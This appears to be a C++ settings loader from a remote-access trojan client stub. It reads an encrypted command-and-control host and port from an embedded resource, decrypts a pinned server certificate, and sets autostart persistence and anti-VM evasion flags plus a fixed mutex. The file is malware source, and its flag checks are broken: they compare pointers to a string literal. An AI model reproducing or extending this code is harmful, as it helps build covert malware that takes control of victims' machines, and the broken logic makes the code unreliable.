#include "Settings.hpp"
#include "DebugOutput.h"

#include <Windows.h>

Algorithm::Aes256 Settings::aes256;
std::string Settings::Host;
int Settings::Port;
X509* Settings::ServerCertificate = nullptr;
bool Settings::Autostart;
std::string Settings::MTX;
bool Settings::AntiVM;


bool Settings::InitializeSettings()
{
    try
    {
        const int STORELOCATION = 1;
        struct Details {
            char Host[300 + 1]; // Decrypt
            char Port[300 + 1]; // Decrypt
            char Certificate[1500 + 1]; // Decrypt -> base64
            char Autostart[20 + 1]; //base64
            char AntiVM[20 + 1]; //base64
        };

        HRSRC ResourceLocation;
        HGLOBAL ResDataHandle;
        DWORD ResourceSize;
        char* ResourcePointer;
        Details* details;
        details = (Details*)malloc(sizeof(Details));
        memset(details, 0, sizeof(Details));
        ResourceLocation = FindResource(nullptr, MAKEINTRESOURCE(STORELOCATION), RT_RCDATA);
        if (ResourceLocation == nullptr) {
            DEBUG_OUTPUT(std::cout << "Resource is not found, this is a new stub" << std::endl;)
                return false;
        }
        ResourceSize = SizeofResource(nullptr, ResourceLocation);
        if (ResourceSize == 0) {
            DEBUG_OUTPUT(std::cout << "Resource size error, some error occurred" << std::endl;)
                return false;
        }
        ResDataHandle = LoadResource(nullptr, ResourceLocation);
        if (ResDataHandle == nullptr) {
            DEBUG_OUTPUT(std::cout << "Failed to load resource" << std::endl;)
                return false;
        }
        ResourcePointer = (char*)LockResource(ResDataHandle); // Use reset to change the pointer
        if (ResourcePointer == 0) {
            DEBUG_OUTPUT(std::cout << "Failed to lock resource from handle" << std::endl;)
                return false;
        }
        details = (Details*)ResourcePointer;

        //Initialize variables
        Host = aes256.Decrypt(std::string(details->Host)).data();
        Port = std::stoi(aes256.Decrypt(std::string(details->Port)).data());

        //std::cout << Host << std::endl;
        //std::cout << Port << std::endl;

        std::vector<uint8_t> tmp = Botan::unlock(Botan::base64_decode(aes256.Decrypt("Osog+GGTx6nr8S/F7kOgjl/LC7P46+omgW2UAxT/22dhnj1/L/BaiinuxLsWw+xfdnT5Msl0U2NOW2oOcnZJLsiYI7whZK2gMhLC6lmiur4rkHHRozlmFlrioLayeZjppIzfqupO17vtXbdL6cNR5PHWRoovk9g8sy2eb5LDCnJq4UC2Ftk8nhAx0xuDQAsBavE2EkRqb3oFghQent+hKV9upIC/TL+2Tods/rGv4hdv7TFNvZkYxsk0Vz6p95coP0IYYAdBCzOMtloPmNuHBp3Uufxk4SUbUWQOre+bNvTeWoa4R1m4+61e3utLVn/2KY69iH5qTqDm/H9CRvJ8GnpivcXbLVvMhgCQ0ZKZEN0lq1OtiXmu4EqyP/JeK4aJjiHuMKnG0sY/Vz/FRKmkDG6gPYISM0nPcCIncwC4ujfiFpGl86WpVOhl5b5Nz7xcgnxca6UJXFnCX8Ae2tUy3IjCFJkSH3nx0HKTEy1IoiLNzlyTHpm3F9S0zwyAhJX7HfoeaFl71RTwfbcEvyFVeHdmsBAJo9l52kwJG4DqyPMoXnV8nkLteuToekVi/7SkGCIP5f1CMFiweP8WGoRfrVHBPqgrepFP0rkRYbjw8e9gHDYjkPfUiOgZJgZM7trxx5Ap18Uo7JvLF+ER9mcl9atYn3tOxw6Mnd8vddxC1zEn9jvRszEbwf0/tEnfaxfjkU70RVEiccTB3GHqO+cRTDT+1gO1M9B6HKFRqszs8OX2qPqISn0YXLksYOo3eU+Pb2J3BzBhcwtUcxyK0YzdfF0uoiO3KlaYVAGwf4VnQjKjcwFkHsaZ99ZOpOAYifXCeu9FMHmkFjJ7sMD6zus26StuvYFCto7lW9csaAKLcNQQSkE2Nws0uVw1uV6K7r+42lp6y01web0voHzxHxCZv4rr7WNaQUhbhUMnUYAWwlMHkp0fcG7Md8qDLB76GqpAit6xmWMsXlFA2xUtxsIfsdyWCmr1XNyBviI/neqJ0BfJ3+lSPtLcjoPTH2RnjchRNxG6jg/mN3wax34f0Lsy+9/4qBYJqq6M24QW4zhgfzUrYPX8J8D4yTiF6Eipkv5c7DpKEuXbSxLZA49EERfXF6CygOrsm/EWsdYC3W0eeisC3U33+AWpreqJ3rwC25d2qF0P1tTrrxZ/5EtBRCiQtIVczzfPKXoPWekc+reC1OgbkxBhCh3ZPPRzeptK5K+NU7minW9q33Sqhvuzk3EFQ2iHN7sQZI+bn/abG0pja9uZlPD6+EoAvCjoX9DUxDPTOkScIOxte8yqAKln5CDXMQ==")));
        const unsigned char* buffer = tmp.data();
        X509_free(ServerCertificate);
        ServerCertificate = d2i_X509(NULL, &buffer, tmp.size());
        if (!ServerCertificate) {
            return false;
        }

        if (reinterpret_cast<char*>(Botan::unlock(Botan::base64_decode(std::string(details->Autostart))).data()) == "true")
            Autostart = true;
        else
            Autostart = false;
        
        MTX = "krfrJJ__&&3/r3rUfreertgR/Rfzd/vfd44V";

        if (reinterpret_cast<char*>(Botan::unlock(Botan::base64_decode(std::string(details->AntiVM))).data()) == "true")
            AntiVM = true;
        else
            AntiVM = false;

        return true;
    }
    catch (...) { return false; }
}

